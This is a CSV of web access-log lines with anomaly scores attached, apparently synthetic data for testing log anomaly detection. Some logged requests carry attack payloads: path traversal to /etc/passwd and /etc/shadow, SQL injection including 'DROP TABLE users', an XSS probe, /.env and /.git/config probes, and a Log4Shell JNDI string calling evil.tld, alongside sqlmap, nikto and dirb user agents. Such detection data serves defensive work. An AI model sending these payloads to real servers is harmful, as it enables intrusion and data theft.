score_content,score_session,score_fused,score_fused_norm,line
68.58672332763672,,68.58672332763672,68.58672332763672,100.143.229.198 - - [10/Jan/2025:12:02:46 +0100] "HEAD /search?q=phone HTTP/1.1" 200 13903 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
93.97309875488281,,93.97309875488281,93.97309875488281,205.195.229.38 - - [10/Jan/2025:12:02:47 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 13451 "https://news.ycombinator.com/" "curl/7.85.0"
48.83206558227539,,48.83206558227539,48.83206558227539,152.202.187.47 - - [10/Jan/2025:12:02:49 +0100] "DELETE /search?q=monitor HTTP/1.1" 200 5730 "https://example.com/" "curl/7.85.0"
11040.7744140625,,11040.7744140625,11040.7744140625,226.163.62.105 - - [10/Jan/2025:12:02:49 +0100] "POST /admin HTTP/1.1" 500 656 "https://example.com/" "dirb/2.22"
30225.5703125,,30225.5703125,30225.5703125,97.25.244.164 - - [10/Jan/2025:12:02:50 +0100] "TRACE /api/products HTTP/1.1" 403 553 "-" "sqlmap/1.7.2#stable"
71.92391967773438,,71.92391967773438,71.92391967773438,43.87.115.72 - - [10/Jan/2025:12:02:51 +0100] "OPTIONS /logout HTTP/1.1" 200 5989 "-" "python-requests/2.31.0"
26.645788192749023,,26.645788192749023,26.645788192749023,59.182.18.211 - - [10/Jan/2025:12:02:51 +0100] "POST /search?q=router HTTP/1.1" 200 19641 "-" "nikto/2.5.0"
30169.544921875,,30169.544921875,30169.544921875,241.135.57.238 - - [10/Jan/2025:12:02:51 +0100] "HEAD /contact HTTP/1.1" 403 693 "-" "Wget/1.21.2 (linux-gnu)"
68.55436706542969,,68.55436706542969,68.55436706542969,238.17.119.242 - - [10/Jan/2025:12:02:53 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 6873 "https://www.google.com/" "python-requests/2.31.0"
24.073408126831055,,24.073408126831055,24.073408126831055,192.94.207.232 - - [10/Jan/2025:12:02:53 +0100] "GET /search?q=ssd HTTP/1.1" 200 2074 "-" "curl/7.85.0"
93.9410400390625,,93.9410400390625,93.9410400390625,14.146.252.153 - - [10/Jan/2025:12:02:56 +0100] "OPTIONS /api/product?id=123 HTTP/1.1" 200 4664 "https://news.ycombinator.com/" "curl/7.85.0"
124.9459457397461,,124.9459457397461,124.9459457397461,208.54.4.227 - - [10/Jan/2025:12:02:57 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 3667 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2907564342021942,,0.2907564342021942,0.2907564342021942,51.23.224.225 - - [10/Jan/2025:12:02:58 +0100] "GET /assets/app.css HTTP/1.1" 200 17788 "https://example.com/" "nikto/2.5.0"
125.14495086669922,,125.14495086669922,125.14495086669922,65.179.78.69 - - [10/Jan/2025:12:02:58 +0100] "TRACE /search?q=ssd HTTP/1.1" 200 17280 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
93.90520477294922,,93.90520477294922,93.90520477294922,43.10.152.85 - - [10/Jan/2025:12:02:59 +0100] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://twitter.com/" "curl/7.85.0"
2.953869104385376,,2.953869104385376,2.953869104385376,13.201.207.73 - - [10/Jan/2025:12:03:01 +0100] "GET /assets/app.js HTTP/1.1" 304 7228 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
94.041259765625,,94.041259765625,94.041259765625,148.148.196.76 - - [10/Jan/2025:12:03:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 204 19775 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
48.87881851196289,,48.87881851196289,48.87881851196289,243.102.26.137 - - [10/Jan/2025:12:03:01 +0100] "DELETE /search?q=laptop HTTP/1.1" 200 12107 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.6527156829834,,26.6527156829834,26.6527156829834,211.98.106.88 - - [10/Jan/2025:12:03:01 +0100] "POST /api/product?id=123 HTTP/1.1" 200 16670 "-" "python-requests/2.31.0"
34.91038131713867,,34.91038131713867,34.91038131713867,12.6.249.27 - - [10/Jan/2025:12:03:04 +0100] "PUT /api/product?id=123 HTTP/1.1" 200 9976 "https://news.ycombinator.com/" "python-requests/2.31.0"
101.39338684082031,,101.39338684082031,101.39338684082031,175.221.45.91 - - [10/Jan/2025:12:03:05 +0100] "TRACE /wp-login.php HTTP/1.1" 200 13126 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.38618361949920654,,0.38618361949920654,0.38618361949920654,1.144.230.162 - - [10/Jan/2025:12:03:05 +0100] "GET /index.html HTTP/1.1" 200 13228 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.2911226749420166,,2.2911226749420166,2.2911226749420166,222.9.92.211 - - [10/Jan/2025:12:03:05 +0100] "GET / HTTP/1.1" 200 19292 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
48.889278411865234,,48.889278411865234,48.889278411865234,167.109.190.77 - - [10/Jan/2025:12:03:08 +0100] "DELETE /search?q=phone HTTP/1.1" 200 8626 "https://news.ycombinator.com/" "nikto/2.5.0"
125.0427017211914,,125.0427017211914,125.0427017211914,6.107.194.97 - - [10/Jan/2025:12:03:08 +0100] "TRACE /api/product?id=123 HTTP/1.1" 200 4802 "-" "curl/7.85.0"
12.716693878173828,,12.716693878173828,12.716693878173828,26.150.198.67 - - [10/Jan/2025:12:03:08 +0100] "PUT /api/products HTTP/1.1" 200 3032 "https://example.com/" "dirb/2.22"
74.6460189819336,,74.6460189819336,74.6460189819336,16.48.21.13 - - [10/Jan/2025:12:03:09 +0100] "OPTIONS /login HTTP/1.1" 304 18202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.9717018604278564,,2.9717018604278564,2.9717018604278564,77.220.83.242 - - [10/Jan/2025:12:03:09 +0100] "GET /assets/app.css HTTP/1.1" 304 19962 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
124.99854278564453,,124.99854278564453,124.99854278564453,26.217.76.7 - - [10/Jan/2025:12:03:10 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 19135 "-" "nikto/2.5.0"
2.0139424800872803,,2.0139424800872803,2.0139424800872803,164.150.137.60 - - [10/Jan/2025:12:03:13 +0100] "GET /logout HTTP/1.1" 200 12097 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
68.52881622314453,,68.52881622314453,68.52881622314453,114.118.102.151 - - [10/Jan/2025:12:03:16 +0100] "HEAD /search?q=router HTTP/1.1" 200 4273 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.5671234130859375,,4.5671234130859375,4.5671234130859375,232.245.31.125 - - [10/Jan/2025:12:03:16 +0100] "POST /contact HTTP/1.1" 200 15329 "https://example.com/" "curl/7.85.0"
29.186704635620117,,29.186704635620117,29.186704635620117,210.132.62.129 - - [10/Jan/2025:12:03:16 +0100] "POST /search?q=laptop HTTP/1.1" 302 2034 "https://news.ycombinator.com/" "nikto/2.5.0"
93.97212219238281,,93.97212219238281,93.97212219238281,59.128.215.78 - - [10/Jan/2025:12:03:17 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 237 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
103.01655578613281,,103.01655578613281,103.01655578613281,142.231.73.169 - - [10/Jan/2025:12:03:20 +0100] "TRACE /contact HTTP/1.1" 200 13403 "-" "nikto/2.5.0"
26.91368865966797,,26.91368865966797,26.91368865966797,132.247.156.122 - - [10/Jan/2025:12:03:23 +0100] "DELETE /about HTTP/1.1" 200 18284 "https://www.google.com/" "nikto/2.5.0"
24.055370330810547,,24.055370330810547,24.055370330810547,19.54.209.111 - - [10/Jan/2025:12:03:23 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14193 "-" "curl/7.85.0"
12.910351753234863,,12.910351753234863,12.910351753234863,207.174.123.242 - - [10/Jan/2025:12:03:24 +0100] "PUT /about HTTP/1.1" 200 12709 "https://www.google.com/" "python-requests/2.31.0"
68.56629943847656,,68.56629943847656,68.56629943847656,240.12.183.108 - - [10/Jan/2025:12:03:27 +0100] "HEAD /search?q=laptop HTTP/1.1" 200 14820 "https://www.google.com/" "python-requests/2.31.0"
24.053627014160156,,24.053627014160156,24.053627014160156,25.160.19.9 - - [10/Jan/2025:12:03:30 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 11142 "https://news.ycombinator.com/" "dirb/2.22"
4.606404781341553,,4.606404781341553,4.606404781341553,69.33.76.168 - - [10/Jan/2025:12:03:31 +0100] "GET /logout HTTP/1.1" 302 3256 "https://www.google.com/" "nikto/2.5.0"
46.6127815246582,,46.6127815246582,46.6127815246582,31.58.112.41 - - [10/Jan/2025:12:03:34 +0100] "HEAD /login HTTP/1.1" 200 19778 "https://twitter.com/" "sqlmap/1.7.2#stable"
71.11862182617188,,71.11862182617188,71.11862182617188,2.203.54.114 - - [10/Jan/2025:12:03:37 +0100] "HEAD /search?q=router HTTP/1.1" 301 6695 "https://news.ycombinator.com/" "nikto/2.5.0"
0.29273009300231934,,0.29273009300231934,0.29273009300231934,128.243.179.216 - - [10/Jan/2025:12:03:37 +0100] "GET /assets/app.css HTTP/1.1" 200 18476 "https://www.google.com/" "python-requests/2.31.0"
102.87708282470703,,102.87708282470703,102.87708282470703,139.60.51.242 - - [10/Jan/2025:12:03:38 +0100] "TRACE /phpmyadmin HTTP/1.1" 201 3229 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
11.072723388671875,,11.072723388671875,11.072723388671875,80.47.139.39 - - [10/Jan/2025:12:03:40 +0100] "PUT /../../etc/passwd HTTP/1.1" 200 6803 "-" "curl/7.85.0"
68.57950592041016,,68.57950592041016,68.57950592041016,178.147.180.31 - - [10/Jan/2025:12:03:43 +0100] "HEAD /search?q=camera HTTP/1.1" 200 19542 "https://twitter.com/" "sqlmap/1.7.2#stable"
26.897724151611328,,26.897724151611328,26.897724151611328,98.231.154.132 - - [10/Jan/2025:12:03:45 +0100] "DELETE /login HTTP/1.1" 200 13059 "-" "Wget/1.21.2 (linux-gnu)"
11.426454544067383,,11.426454544067383,11.426454544067383,243.95.144.209 - - [10/Jan/2025:12:03:47 +0100] "PUT /.env HTTP/1.1" 200 3146 "https://twitter.com/" "dirb/2.22"
4.510634899139404,,4.510634899139404,4.510634899139404,157.61.254.225 - - [10/Jan/2025:12:03:50 +0100] "GET /api/products HTTP/1.1" 302 8293 "-" "python-requests/2.31.0"
24.036582946777344,,24.036582946777344,24.036582946777344,32.184.149.184 - - [10/Jan/2025:12:03:51 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 8907 "-" "nikto/2.5.0"
4.617237091064453,,4.617237091064453,4.617237091064453,13.214.209.231 - - [10/Jan/2025:12:03:52 +0100] "POST /admin HTTP/1.1" 200 8308 "https://twitter.com/" "curl/7.85.0"
30129.181640625,,30129.181640625,30129.181640625,15.105.110.174 - - [10/Jan/2025:12:03:53 +0100] "POST /api/products HTTP/1.1" 429 975 "https://news.ycombinator.com/" "python-requests/2.31.0"
30194.7421875,,30194.7421875,30194.7421875,227.177.184.54 - - [10/Jan/2025:12:03:55 +0100] "OPTIONS /about HTTP/1.1" 401 855 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.61677360534668,,26.61677360534668,26.61677360534668,39.94.196.178 - - [10/Jan/2025:12:03:57 +0100] "POST /search?q=laptop HTTP/1.1" 200 10478 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.520172119140625,,26.520172119140625,26.520172119140625,237.176.173.60 - - [10/Jan/2025:12:03:58 +0100] "POST /search?q=headphones HTTP/1.1" 200 5345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.24954451620578766,,0.24954451620578766,0.24954451620578766,237.233.133.76 - - [10/Jan/2025:12:03:59 +0100] "GET /assets/app.css HTTP/1.1" 200 6256 "-" "python-requests/2.31.0"
26.621910095214844,,26.621910095214844,26.621910095214844,106.21.251.157 - - [10/Jan/2025:12:04:00 +0100] "POST /api/product?id=123 HTTP/1.1" 201 8328 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
68.57438659667969,,68.57438659667969,68.57438659667969,9.236.94.178 - - [10/Jan/2025:12:04:00 +0100] "HEAD /api/product?id=123 HTTP/1.1" 200 12471 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.928354501724243,,2.928354501724243,2.928354501724243,75.120.21.238 - - [10/Jan/2025:12:04:01 +0100] "GET /assets/app.css HTTP/1.1" 302 18891 "https://www.google.com/" "dirb/2.22"
4.682661533355713,,4.682661533355713,4.682661533355713,9.254.160.165 - - [10/Jan/2025:12:04:04 +0100] "GET /login HTTP/1.1" 301 19686 "https://www.google.com/" "curl/7.85.0"
48.910404205322266,,48.910404205322266,48.910404205322266,88.47.11.7 - - [10/Jan/2025:12:04:04 +0100] "DELETE /api/product?id=123 HTTP/1.1" 200 17453 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
15.338835716247559,,15.338835716247559,15.338835716247559,184.179.229.75 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/products HTTP/1.1" 302 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
34.930850982666016,,34.930850982666016,34.930850982666016,166.175.137.188 - - [10/Jan/2025:12:04:05 +0100] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 19821 "-" "sqlmap/1.7.2#stable"
101.31355285644531,,101.31355285644531,101.31355285644531,139.97.237.230 - - [10/Jan/2025:12:04:08 +0100] "TRACE /../../etc/passwd HTTP/1.1" 200 18574 "https://www.google.com/" "sqlmap/1.7.2#stable"
26.757843017578125,,26.757843017578125,26.757843017578125,20.66.107.129 - - [10/Jan/2025:12:04:09 +0100] "DELETE /api/products HTTP/1.1" 200 18644 "https://twitter.com/" "curl/7.85.0"
44.710662841796875,,44.710662841796875,44.710662841796875,138.121.252.30 - - [10/Jan/2025:12:04:10 +0100] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 17063 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.7172794342041,,26.7172794342041,26.7172794342041,49.158.99.16 - - [10/Jan/2025:12:04:13 +0100] "DELETE /dashboard HTTP/1.1" 200 3467 "-" "python-requests/2.31.0"
1.9832580089569092,,1.9832580089569092,1.9832580089569092,70.253.241.176 - - [10/Jan/2025:12:04:15 +0100] "GET /logout HTTP/1.1" 200 4491 "https://example.com/" "sqlmap/1.7.2#stable"
11.055007934570312,,11.055007934570312,11.055007934570312,68.182.53.119 - - [10/Jan/2025:12:04:18 +0100] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2169 "https://www.google.com/" "python-requests/2.31.0"
124.99604034423828,,124.99604034423828,124.99604034423828,131.231.214.243 - - [10/Jan/2025:12:04:19 +0100] "TRACE /search?q=headphones HTTP/1.1" 200 18206 "https://example.com/" "python-requests/2.31.0"
2.284604787826538,,2.284604787826538,2.284604787826538,43.57.35.166 - - [10/Jan/2025:12:04:22 +0100] "GET / HTTP/1.1" 200 17016 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
46.508792877197266,,46.508792877197266,46.508792877197266,68.223.154.86 - - [10/Jan/2025:12:04:23 +0100] "HEAD /contact HTTP/1.1" 200 10360 "https://example.com/" "dirb/2.22"
127.7409896850586,,127.7409896850586,127.7409896850586,73.159.65.114 - - [10/Jan/2025:12:04:23 +0100] "TRACE /search?q=ssd HTTP/1.1" 301 19987 "https://twitter.com/" "python-requests/2.31.0"
26.570188522338867,,26.570188522338867,26.570188522338867,161.212.223.94 - - [10/Jan/2025:12:04:25 +0100] "POST /search?q=headphones HTTP/1.1" 200 19686 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.37195825576782227,,0.37195825576782227,0.37195825576782227,228.243.180.254 - - [10/Jan/2025:12:04:27 +0100] "GET /index.html HTTP/1.1" 200 9320 "https://news.ycombinator.com/" "dirb/2.22"
30124.4453125,,30124.4453125,30124.4453125,147.137.114.95 - - [10/Jan/2025:12:04:29 +0100] "GET /assets/app.js HTTP/1.1" 401 8 "https://www.google.com/" "curl/7.85.0"
68.56953430175781,,68.56953430175781,68.56953430175781,50.188.57.13 - - [10/Jan/2025:12:04:31 +0100] "HEAD /search?q=phone HTTP/1.1" 200 8824 "https://news.ycombinator.com/" "python-requests/2.31.0"
29.289701461791992,,29.289701461791992,29.289701461791992,4.227.200.145 - - [10/Jan/2025:12:04:34 +0100] "POST /search?q=ssd HTTP/1.1" 302 10301 "https://twitter.com/" "nikto/2.5.0"
23.988649368286133,,23.988649368286133,23.988649368286133,215.211.202.173 - - [10/Jan/2025:12:04:34 +0100] "GET /search?q=monitor HTTP/1.1" 200 5332 "https://twitter.com/" "python-requests/2.31.0"
125.03947448730469,,125.03947448730469,125.03947448730469,61.116.77.49 - - [10/Jan/2025:12:04:36 +0100] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7004 "https://news.ycombinator.com/" "nikto/2.5.0"
0.3008040487766266,,0.3008040487766266,0.3008040487766266,54.224.145.176 - - [10/Jan/2025:12:04:39 +0100] "GET /assets/app.js HTTP/1.1" 204 14818 "-" "curl/7.85.0"
0.2958754599094391,,0.2958754599094391,0.2958754599094391,247.139.11.226 - - [10/Jan/2025:12:04:40 +0100] "GET /assets/app.js HTTP/1.1" 200 11640 "https://twitter.com/" "dirb/2.22"
46.444190979003906,,46.444190979003906,46.444190979003906,229.170.178.17 - - [10/Jan/2025:12:04:40 +0100] "HEAD /dashboard HTTP/1.1" 200 11301 "https://www.google.com/" "nikto/2.5.0"
1.8591324090957642,,1.8591324090957642,1.8591324090957642,172.117.173.129 - - [10/Jan/2025:12:04:40 +0100] "GET /api/products HTTP/1.1" 200 2795 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
34.93967819213867,,34.93967819213867,34.93967819213867,107.114.101.102 - - [10/Jan/2025:12:04:43 +0100] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 2176 "https://example.com/" "python-requests/2.31.0"
11161.9208984375,,11161.9208984375,11161.9208984375,78.231.98.112 - - [10/Jan/2025:12:04:46 +0100] "TRACE /search?q=phone HTTP/1.1" 500 735 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.92678165435791,,12.92678165435791,12.92678165435791,52.52.170.78 - - [10/Jan/2025:12:04:46 +0100] "PUT /about HTTP/1.1" 200 18021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.937330722808838,,4.937330722808838,4.937330722808838,1.48.175.184 - - [10/Jan/2025:12:04:48 +0100] "GET / HTTP/1.1" 304 12495 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
37.62911605834961,,37.62911605834961,37.62911605834961,26.1.93.29 - - [10/Jan/2025:12:04:50 +0100] "PUT /search?q=ssd HTTP/1.1" 304 18345 "https://example.com/" "nikto/2.5.0"
0.2995757758617401,,0.2995757758617401,0.2995757758617401,64.15.220.69 - - [10/Jan/2025:12:04:51 +0100] "GET /assets/app.js HTTP/1.1" 200 12693 "-" "dirb/2.22"
24.017480850219727,,24.017480850219727,24.017480850219727,172.70.253.117 - - [10/Jan/2025:12:04:53 +0100] "GET /search?q=laptop HTTP/1.1" 200 7041 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.754661560058594,,26.754661560058594,26.754661560058594,140.235.149.35 - - [10/Jan/2025:12:04:53 +0100] "DELETE /dashboard HTTP/1.1" 200 13080 "https://news.ycombinator.com/" "dirb/2.22"
34.94278335571289,,34.94278335571289,34.94278335571289,81.51.111.55 - - [10/Jan/2025:12:04:53 +0100] "PUT /search?q=phone HTTP/1.1" 200 17426 "-" "python-requests/2.31.0"
51.33700180053711,,51.33700180053711,51.33700180053711,240.161.17.55 - - [10/Jan/2025:12:04:55 +0100] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 11095 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30171.6640625,,30171.6640625,30171.6640625,240.144.139.254 - - [10/Jan/2025:12:04:58 +0100] "DELETE /search?q=camera HTTP/1.1" 401 353 "https://example.com/" "python-requests/2.31.0"
30125.705078125,,30125.705078125,30125.705078125,240.200.192.126 - - [10/Jan/2025:12:05:01 +0100] "GET /about HTTP/1.1" 400 762 "https://twitter.com/" "dirb/2.22"
0.37787577509880066,,0.37787577509880066,0.37787577509880066,208.72.111.241 - - [10/Jan/2025:12:05:03 +0100] "GET /index.html HTTP/1.1" 200 10875 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.2807023227214813,,0.2807023227214813,0.2807023227214813,250.44.25.197 - - [10/Jan/2025:12:05:06 +0100] "GET /assets/app.css HTTP/1.1" 200 14500 "https://example.com/" "python-requests/2.31.0"
71.14976501464844,,71.14976501464844,71.14976501464844,222.196.83.75 - - [10/Jan/2025:12:05:07 +0100] "HEAD /api/product?id=123 HTTP/1.1" 302 5948 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
125.0928726196289,,125.0928726196289,125.0928726196289,118.129.75.186 - - [10/Jan/2025:12:05:10 +0100] "TRACE /search?q=phone HTTP/1.1" 201 17849 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2607375383377075,,0.2607375383377075,0.2607375383377075,228.75.88.124 - - [10/Jan/2025:12:05:10 +0100] "GET /assets/app.css HTTP/1.1" 200 417 "https://news.ycombinator.com/" "curl/7.85.0"
0.2784404754638672,,0.2784404754638672,0.2784404754638672,77.70.253.154 - - [10/Jan/2025:12:05:11 +0100] "GET /assets/app.css HTTP/1.1" 201 14350 "https://twitter.com/" "python-requests/2.31.0"
29.243650436401367,,29.243650436401367,29.243650436401367,126.139.154.86 - - [10/Jan/2025:12:05:11 +0100] "POST /api/product?id=123 HTTP/1.1" 302 13335 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
1.8984894752502441,,1.8984894752502441,1.8984894752502441,56.70.45.68 - - [10/Jan/2025:12:05:13 +0100] "GET /api/products HTTP/1.1" 200 12680 "https://www.google.com/" "python-requests/2.31.0"
44.8947639465332,,44.8947639465332,44.8947639465332,239.140.102.87 - - [10/Jan/2025:12:05:16 +0100] "HEAD /.git/config HTTP/1.1" 200 7440 "https://example.com/" "curl/7.85.0"
26.7934513092041,,26.7934513092041,26.7934513092041,206.28.202.105 - - [10/Jan/2025:12:05:16 +0100] "DELETE /profile HTTP/1.1" 200 5410 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
102.90438842773438,,102.90438842773438,102.90438842773438,129.167.154.200 - - [10/Jan/2025:12:05:18 +0100] "TRACE /api/products HTTP/1.1" 200 5261 "-" "curl/7.85.0"
24.211057662963867,,24.211057662963867,24.211057662963867,216.46.172.251 - - [10/Jan/2025:12:05:21 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 10282 "https://example.com/" "curl/7.85.0"
46.47807312011719,,46.47807312011719,46.47807312011719,148.173.230.179 - - [10/Jan/2025:12:05:21 +0100] "HEAD /contact HTTP/1.1" 200 2179 "-" "sqlmap/1.7.2#stable"
1.9714901447296143,,1.9714901447296143,1.9714901447296143,89.4.217.110 - - [10/Jan/2025:12:05:22 +0100] "GET /profile HTTP/1.1" 200 10473 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.51678466796875,,4.51678466796875,4.51678466796875,235.223.126.156 - - [10/Jan/2025:12:05:25 +0100] "POST /contact HTTP/1.1" 204 1040 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.08393096923828,,70.08393096923828,70.08393096923828,233.54.58.232 - - [10/Jan/2025:12:05:26 +0100] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 423 "-" "curl/7.85.0"
26.74433135986328,,26.74433135986328,26.74433135986328,166.230.129.98 - - [10/Jan/2025:12:05:27 +0100] "DELETE /api/products HTTP/1.1" 200 14114 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11040.763671875,,11040.763671875,11040.763671875,75.50.96.203 - - [10/Jan/2025:12:05:30 +0100] "POST /api/products HTTP/1.1" 502 614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.032804489135742,,24.032804489135742,24.032804489135742,46.35.178.117 - - [10/Jan/2025:12:05:31 +0100] "GET /search?q=monitor HTTP/1.1" 200 17601 "https://twitter.com/" "dirb/2.22"
93.9185562133789,,93.9185562133789,93.9185562133789,59.84.85.44 - - [10/Jan/2025:12:05:32 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 1341 "-" "Wget/1.21.2 (linux-gnu)"
34.88876724243164,,34.88876724243164,34.88876724243164,229.75.227.215 - - [10/Jan/2025:12:05:34 +0100] "PUT /search?q=laptop HTTP/1.1" 200 8360 "https://www.google.com/" "dirb/2.22"
74.4743881225586,,74.4743881225586,74.4743881225586,228.224.189.237 - - [10/Jan/2025:12:05:36 +0100] "OPTIONS /phpmyadmin HTTP/1.1" 304 19440 "-" "curl/7.85.0"
1.864817500114441,,1.864817500114441,1.864817500114441,167.130.124.94 - - [10/Jan/2025:12:05:39 +0100] "GET /api/products HTTP/1.1" 200 4267 "-" "curl/7.85.0"
24.11199188232422,,24.11199188232422,24.11199188232422,67.90.180.169 - - [10/Jan/2025:12:05:42 +0100] "GET /search?q=ssd HTTP/1.1" 204 14133 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.5520243644714355,,4.5520243644714355,4.5520243644714355,225.249.171.128 - - [10/Jan/2025:12:05:45 +0100] "POST /contact HTTP/1.1" 200 10837 "https://example.com/" "sqlmap/1.7.2#stable"
103.00680541992188,,103.00680541992188,103.00680541992188,126.222.182.75 - - [10/Jan/2025:12:05:48 +0100] "TRACE /contact HTTP/1.1" 200 10536 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
